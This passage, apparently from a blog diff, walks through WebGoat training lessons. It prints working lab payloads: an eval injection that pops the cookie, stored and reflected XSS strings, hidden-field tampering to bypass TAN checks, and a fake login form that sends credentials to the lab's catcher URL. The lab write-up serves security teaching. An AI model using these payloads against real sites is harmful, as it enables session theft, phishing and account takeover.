+if(field1.indexOf("');") != -1 &amp;&amp; field1.indexOf("alert") != -1 &amp;&amp; field1.indexOf("document.cookie") != -1)
+</code></p>
+
+<p>So, this looks in field1, which is the access code, for the occurrence of <code>&lsquo;);</code>, the occurrence of the string &ldquo;alert&rdquo; and the occurrence of &ldquo;document.cookie&rdquo;. And we know what we have to use the vulnerable field to alert the cookie. First, let&rsquo;s see how the value is encapsulated. I passed the value of 12, which wouldn&rsquo;t meet the 3 digit requirement, and this is the popup that I got in return: <code>Whoops: You entered an incorrect access code of &ldquo;12&rdquo;</code></p>
+
+<p>At first, I was like, yeah I got it, and did this:</p>
+
+<p><code>&lsquo;);alert(document.cookie);</code></p>
+
+<p>It didn&rsquo;t work, and I traced the answer of why to this line:</p>
+
+<p><code>js
+out.write("alert('Whoops: You entered an incorrect access code of \"" + field1 + "\"');");
+</code></p>
+
+<p>This is the alert that we&rsquo;ll have to exploit in order to alert the cookie. I will remove the escaping backslashes for a better visualization below. With the dummy value 12, it looks like this:</p>
+
+<p><code>js
+out.write("alert('Whoops: You entered an incorrect access code of ""  12  ""');");
+</code></p>
+
+<p>With the failed injection attempt, it looks like this:</p>
+
+<p><code>js
+out.write("alert('Whoops: You entered an incorrect access code of ""  12');alert(document.cookie);  ""');");
+</code></p>
+
+<p>There is a stray <code>&ldquo;)</code> at the end that is not closed off, breaking the query. To fix that, I adjusted it to:</p>
+
+<p><code>&lsquo;);alert(document.cookie);(&rsquo;</code></p>
+
+<p>Now the injection looks like this:</p>
+
+<p><code>js
+out.write("alert('Whoops: You entered an incorrect access code of ""  12');alert(document.cookie);('  ""');");
+</code></p>
+
+<p>Breaking it up into pieces:</p>
+
+<p><code>alert(&lsquo;Whoops: You entered an incorrect access code of &ldquo;&rdquo;  12&rsquo;);</code></p>
+
+<p><code>alert(document.cookie);</code></p>
+
+<p><code>(&lsquo;  &ldquo;&rdquo;&rsquo;)</code></p>
+
+<p>Now everything is closed nicely, and the injection succeeds. After the first popup with the <em>Whoops: You entered an incorrect access code of &ldquo;12</em>, you get the second alert with the cookie.</p>
+
+<p>This ended up as a very long explanation, and I hope I got it right. Looking at the solution initially, I had no idea why it worked, but after poring over the code, it became clearer. And all this is possible because the attacker controlled string is passed directly to the <em>eval()</em> function, with no sanitization taking place.</p>
+
+<p><strong>Insecure Client Storage</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+It is always a good practice to validate all input on the server side. Leaving the mechanism for validation on the client side leaves it vulnerable to reverse engineering. Remember, anything on the client side should not be considered a secret.</p>
+
+<p><img class="center" src="/images/webgoat/client_storage.png" title="&lsquo;insecure client storage&rsquo; &lsquo;insecure client storage&rsquo;" ></p>
+
+<p>Look inside <code>clientSideValidation.js</code> for the following:</p>
+
+<p>``` js
+var coupons = [&ldquo;nvojubmq&rdquo;,
+&ldquo;emph&rdquo;,
+&ldquo;sfwmjt&rdquo;,
+&ldquo;faopsc&rdquo;,
+&ldquo;fopttfsq&rdquo;,
+&ldquo;pxuttfsq&rdquo;];</p>
+
+<p>function isValidCoupon(coupon) {
+coupon = coupon.toUpperCase();
+for(var i=0; i&lt;coupons.length; i++) {
+decrypted = decrypt(coupons[i]);
+if(coupon == decrypted){
+ajaxFunction(coupon);
+return true;
+}
+}
+return false; <br/>
+}</p>
+
+<p>function decrypt(code){</p>
+
+<p>code = code.toUpperCase();</p>
+
+<p>alpha = &ldquo;ABCDEFGHIJKLMNOPQRSTUVWXYZ&rdquo;;</p>
+
+<p>caesar = &lsquo;&rsquo;;</p>
+
+<p>for (i = code.length ;i >= 0;i&mdash;){</p>
+
+<p>for (j = 0;j&lt;alpha.length;j++){</p>
+
+<p>if(code.charAt(i) == alpha.charAt(j)){</p>
+
+<p>caesar = caesar + alpha.charAt((j+(alpha.length-1))%alpha.length);
+}     <br/>
+}
+} <br/>
+return caesar;
+}
+```</p>
+
+<p>The coupons are encrypted with a Caesar cipher, but we don&rsquo;t have to manually reverse it. I called the <em>decrypt</em> function on one of the coupon values to receive the decrypted result:</p>
+
+<p><code>plain
+alert(decrypt("nvojubmq"));
+</code></p>
+
+<p>That gave the result PLATINUM.</p>
+
+<p><strong>STAGE 2:</strong> Now, try to get your entire order for free.</p>
+
+<p>Hint: Use Firebug to remove the &ldquo;readonly&rdquo; attribute from the input next to &ldquo;The total charged to your credit card:&rdquo; and set the value to 0.</p>
+
+<p>Just follow the hit, select the element with Firebug, delete the readonly attribute, and set the price to 0. Then purchase stuff for free!</p>
+
+<h3>Authentication Flaws</h3>
+
+<p><strong>Password Strength</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+Accounts are only as secure as their passwords. Most users have the same weak password everywhere. If you want to protect them against brute-force-attacks, your application should have good requirements for passwords. The password should contain lower case letters, capitals and numbers. The longer the password, the better.</p>
+
+<p><img class="center" src="/images/webgoat/pass_stre.png" title="&lsquo;password strength&rsquo; &lsquo;password strength&rsquo;" ></p>
+
+<p>The site required by the lesson was no longer available. I tried other similar sites, but none gave the values required to pass the lesson. so you can just copy them from the solution. I skipped it.</p>
+
+<p><strong>Forgot Password</strong></p>
+
+<p><img class="center" src="/images/webgoat/forgot_pass.png" title="&lsquo;forgot password&rsquo; &lsquo;forgot pass&rsquo;" ></p>
+
+<p>This was a matter of guessing. When giving a username, you are asked a secret question of what is your favorite color. I tried a couple of guesses for the admin user, until I stumbled upon the correct answer, which is green. Then you are presented with the user&rsquo;s password, and looking at the admin password, it would have taken lifetimes to crack it.</p>
+
+<p><strong>Basic Authentication</strong></p>
+
+<p><img class="center" src="/images/webgoat/basic_auth.png" title="&lsquo;basic authentication&rsquo; &lsquo;basic authentication&rsquo;" ></p>
+
+<p>Click submit and intercept the request. You will see the following header: <code>Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=</code>. Decode the Base 64 data for the credentials <em>guest:guest</em>. You will now see a new message:</p>
+
+<p>&ldquo;Congratulations, you have figured out the mechanics of basic authentication.  &ndash; Now you must try to make WebGoat reauthenticate you as:     &ndash; username: basic     &ndash; password: basic. Use the Basic Authentication Menu to start at login page.&rdquo;</p>
+
+<p>&ldquo;Use the hints! One at a time&hellip;&rdquo;</p>
+
+<p>I trapped the request and looked for this: <code>header=Authorization&amp;value=guest%3Aguest&amp;SUBMIT=Submit</code>. But even when I modified it to basic, it didn&rsquo;t work. It turns out, you have to make the web application present you with a login popup like when you first start it. To do that, I deleted the JSESSIONID cookie. But this also wasn&rsquo;t enough. I got the message:</p>
+
+<blockquote><p>You&rsquo;re really close! Changing the session cookie caused the server to create a new session for you. This did not cause the server to reauthenticate you. When you figure out how to force the server to perform
+an authentication request, you have to authenticate as:</p>
+
+<p>user name: basic
+password: basic</p></blockquote>
+
+<p>I had to also modify the Authorization header so that it wouldn&rsquo;t be valid anymore. But that also got me a &ldquo;you&rsquo;re close message&rdquo;:</p>
+
+<blockquote><p>You&rsquo;re almost there! You&rsquo;ve modified the Authorization header but you are still logged in as guest. Look at the request after you typed in the &lsquo;basic&rsquo; user credentials and submitted the request. Remember the
+order of events that occur during Basic Authentication.</p></blockquote>
+
+<p>I had issues with completing this by invalidating the header and the cookie, and then entering the new credentials at popup. So I just restarted the application and logged in as <em>basic</em> from the beginning, after I cleared the saved passwords from the browser. Then the exercise was marked as finished.</p>
+
+<p><strong>Multi Level Login 1</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+A Multi Level Login should provide a strong authentication. This is archived by adding a second layer. After having logged in with your user name and password you are asked for a &lsquo;Transaction Authentication Number&rsquo; (TAN). This is often used by online banking. You get a list with a lots of TANs generated only for you by the bank. Each TAN is used only once. Another method is to provide the TAN by SMS. This has the advantage that an attacker cannot get TANs provided for the user.</p>
+
+<p>General Goal(s):
+In this Lesson you try to get around the strong authentication. You have to break into another account. The user name, password and a already used TAN is provided. You have to make sure the server accepts the TAN even it is already used.</p>
+
+<p><img class="center" src="/images/webgoat/mll.png" title="&lsquo;multi level login&rsquo; &lsquo;multi level login&rsquo;" ></p>
+
+<p>Log in and provide the first TAN. This is a demo stage.</p>
+
+<p><strong>STAGE 2:</strong> Now you are a hacker who already has stolen some information from Jane by a phishing mail. You have the password which is tarzan and the Tan #1 which is 15648</p>
+
+<p>The problem is that the first tan is already used&hellip; try to break into the system anyway.</p>
+
+<p>When you provide the TAN, look inside the request for this: <code>hidden_tan=2&amp;tan=15648+&amp;Submit=Submit</code>. Change the hidden tan to 1 to correspond to the TAN that you have.</p>
+
+<p><strong>Multi Level Login 2</strong></p>
+
+<p><strong>General Goal(s):</strong>
+In this lesson you have to try to break into another account. You have an own account for WebGoat Financial but you want to log into another account only knowing the user name of the victim to attack.</p>
+
+<p><img class="center" src="/images/webgoat/mll2.png" title="&lsquo;multi level login 2&rsquo; &lsquo;multi level login 2&rsquo;" ></p>
+
+<p>This time in the intercepted request, change the hidden user from Joe to Jane.</p>
+
+<h3>Buffer Overflows</h3>
+
+<p><strong>Off-by-One Overflows</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+How to Exploit a Web Based &ldquo;Off-by-One&rdquo; Buffer Overflow.</p>
+
+<p><strong>How the attack works:</strong>
+Despite being more rare, buffer overflow vulnerabilities on the web occur when a tier of the application has insufficient memory allocated to deal with the data submitted by the user. Typically, such a tier would be written in C or a similar language. For the particular subset, namely, off-by-one overflows, this lesson focuses on the consequences of being able to overwrite the position for the trailing null byte. As a result, further information is returned back to the user, due to the fact that no null byte was found.</p>
+
+<p><strong>Lesson Goal(s):</strong></p>
+
+<ul>
+<li>Understand how a buffer overflow vulnerability can be triggered on a web application.</li>
+<li>Understand what type of value lengths are likely to trigger a buffer overflow.</li>
+</ul>
+
+
+<p><img class="center" src="/images/webgoat/offby1.png" title="&lsquo;off by 1 buffer overflow&rsquo; &lsquo;off by 1 BO&rsquo;" ></p>
+
+<p>I tried every field with a 5000 character string generated by <code>pattern_create.rb</code> until I noticed a change in the source. The exploitable field is the room number field. Once I chose the price plan, I saw this message: &ldquo;To complete the lesson, restart lesson and enter VIP first/last name&rdquo;. So I knew I was on the right track, and in the source, I could see new goodies:</p>
+
+<p><code>html
+&lt;input name='a' type='HIDDEN' value='Hacker'&gt;
+&lt;input name='b' type='HIDDEN' value='A'&gt;
+&lt;input name='c' type='HIDDEN' value='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk'&gt;
+&lt;input name='d' type='hidden' value='Johnathan'&gt;
+&lt;input name='e' type='hidden' value='Ravern'&gt;
+&lt;input name='f' type='hidden' value='4321'&gt;
+&lt;input name='g' type='hidden' value='John'&gt;
+&lt;input name='h' type='hidden' value='Smith'&gt;
+&lt;input name='i' type='hidden' value='56'&gt;
+&lt;input name='j' type='hidden' value='Ana'&gt;
+&lt;input name='k' type='hidden' value='Arneta'&gt;
+&lt;input name='l' type='hidden' value='78'&gt;
+&lt;input name='m' type='hidden' value='Lewis'&gt;
+&lt;input name='n' type='hidden' value='Hamilton'&gt;
+&lt;input name='o' type='hidden' value='9901'&gt;
+</code></p>
+
+<p>Pick one of these to submit and complete the lesson.</p>
+
+<h3>Code Quality</h3>
+
+<p><strong>Discover Clues in the HTML</strong></p>
+
+<p><img class="center" src="/images/webgoat/html_comments.png" title="&lsquo;code quality&rsquo; &lsquo;code comments&rsquo;" ></p>
+
+<p>Find the HTML comments in the source: &ldquo;FIXME admin:adminpw&rdquo;, &ldquo;Use Admin to regenerate database&rdquo;</p>
+
+<h3>Concurrency</h3>
+
+<p><strong>Thread Safety Problems</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+Web applications can handle many HTTP requests simultaneously. Developers often use variables that are not thread safe.  Thread safety means that the fields of an object or class always maintain a valid state when used concurrently by multiple threads. It is often possible to exploit a concurrency bug by loading the same page as another user at the exact same time. Because all threads share the same method area, and the method area is where all class variables are stored, multiple threads can attempt to use the same class variables concurrently.</p>
+
+<p><img class="center" src="/images/webgoat/threads.png" title="&lsquo;thread safety&rsquo; &lsquo;thread safety&rsquo;" ></p>
+
+<p>Try submitting the 2 user names from different browsers in very quick succession, and both browsers will return same user information.</p>
+
+<p><strong>Shopping Cart Concurrency Flaw</strong></p>
+
+<p><img class="center" src="/images/webgoat/concurrency.png" title="&lsquo;concurrency flaw&rsquo; &lsquo;concurrency flaw&rsquo;" ></p>
+
+<p>This time, the exploitation will be done in 2 tabs, instead of 2 browsers. Get 2 tabs on the same page.</p>
+
+<p>On Tab1, select a low price item and add it to cart. Go all the way to confirming the purchase.</p>
+
+<p>On Tab2, add to cart an expensive item.</p>
+
+<p>On Tab1, confirm the purchase and you will see this: &ldquo;Thank you for shopping! You have (illegally!) received a 90% discount. Police are on the way to your IP address.&rdquo;</p>
+
+<h3>Cross-Site Scripting (XSS)</h3>
+
+<p><strong>Phishing with XSS</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is used in an HTTP response. With the help of XSS you can do a Phishing Attack and add content to a page which looks official. It is very hard for a victim to determinate that the content is malicious.</p>
+
+<p><strong>General Goal(s):</strong>
+The user should be able to add a form asking for username and password. On submit the input should be sent to <a href="http://localhost/WebGoat/catcher?PROPERTY=yes">http://localhost/WebGoat/catcher?PROPERTY=yes</a> &amp;user=catchedUserName&amp;password=catchedPasswordName</p>
+
+<p><img class="center" src="/images/webgoat/xss_phish.png" title="&lsquo;phishing xss&rsquo; &lsquo;phishing xss&rsquo;" ></p>
+
+<p>I made a fake form with a submit button that sends the credentials to the harverster when clicked. Here it is:</p>
+
+<p><code>html
+&lt;form&gt;
+&lt;form name="stealer"&gt;
+Username: &lt;input type="text" name="username"&gt;&lt;br&gt;
+Password: &lt;input type="password" name="password"&gt;
+&lt;input type="submit" value="Submit" onclick=&lt;script&gt;&lt;img src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&amp;user="+ document.stealer.username.value + "&amp;password=" + document.stealer.password.value + ""&gt;
+&lt;/script&gt;
+&lt;/form&gt;
+</code></p>
+
+<p><strong>LAB: Cross Site Scripting</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+It is always a good practice to scrub all inputs, especially those inputs that will later be used as parameters to OS commands, scripts, and database queries. It is particularly important for content that will be permanently stored somewhere. Users should not be able to create message content that could cause another user to load an undesirable page or undesirable content when the user&rsquo;s message is retrieved.
+XSS can also occur when unvalidated user input is used in an HTTP response. In a reflected XSS attack, an attacker can craft a URL with the attack script and post it to another website, email it, or otherwise get a victim to click on it.</p>
+
+<p>General Goal(s):
+For this exercise, you will perform stored and reflected XSS attacks. You will also implement code changes in the web application to defeat these attacks.</p>
+
+<p><strong>Stage 1: Execute a Stored Cross Site Scripting (XSS) attack.</strong></p>
+
+<p>As &lsquo;Tom&rsquo;, execute a Stored XSS attack against the Street field on the Edit Profile page. Verify that &lsquo;Jerry&rsquo; is affected by the attack.</p>
+
+<p>The passwords for the accounts are the lower-case versions of their given names (e.g. the password for Tom Cat is &ldquo;tom&rdquo;).</p>
+
+<p>I edited Tom&rsquo;s profile and added some XSS on the Street field:</p>
+
+<p>``` plain</p>
+
+<script>alert('Wrong street')</script>
+
+
+<p>```</p>
+
+<p>Whoever views Tom&rsquo;s profile now will get the popup.</p>
+
+<p><strong>Stage 2: Block Stored XSS using Input Validation.</strong></p>
+
+<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>
+
+<p>Implement a fix to block the stored XSS before it can be written to the database. Repeat stage 1 as &lsquo;Eric&rsquo; with &lsquo;David&rsquo; as the manager. Verify that &lsquo;David&rsquo; is not affected by the attack.</p>
+
+<p>Skipped because I use the standard version.</p>
+
+<p><strong>Stage 3: Execute a previously Stored Cross Site Scripting (XSS) attack.</strong></p>
+
+<p>The &lsquo;Bruce&rsquo; employee profile is pre-loaded with a stored XSS attack. Verify that &lsquo;David&rsquo; is affected by the attack even though the fix from stage 2 is in place.</p>
+
+<p>Well, there was no fix in my case, so all I had to do is view Bruce&rsquo;s profile when logged in as David.</p>
+
+<p><strong>Stage 4: Block Stored XSS using Output Encoding.</strong></p>
+
+<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>
+
+<p>Implement a fix to block XSS after it is read from the database. Repeat stage 3. Verify that &lsquo;David&rsquo; is not affected by Bruce&rsquo;s profile attack.</p>
+
+<p>Skipped.</p>
+
+<p><strong>Stage 5: Execute a Reflected XSS attack.</strong></p>
+
+<p>Use a vulnerability on the Search Staff page to craft a URL containing a reflected XSS attack. Verify that another employee using the link is affected by the attack.</p>
+
+<p>It&rsquo;s a simple XSS on the search page:</p>
+
+<p>``` plain</p>
+
+<script>alert('The user has been alerted of your stalking!')</script>
+
+
+<p>```</p>
+
+<p><strong>Stage 6: Block Reflected XSS using Input Validation.</strong></p>
+
+<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>
+
+<p>Implement a fix to block this reflected XSS attack. Repeat step 5. Verify that the attack URL is no longer effective.</p>
+
+<p>Skipped.</p>
+
+<p><strong>Stored XSS Attacks</strong></p>
+
+<p><img class="center" src="/images/webgoat/stored_xss.png" title="&lsquo;stored xss&rsquo; &lsquo;stored xss&rsquo;" ></p>
+
+<p>The XSS vulnerability is in the message box:</p>
+
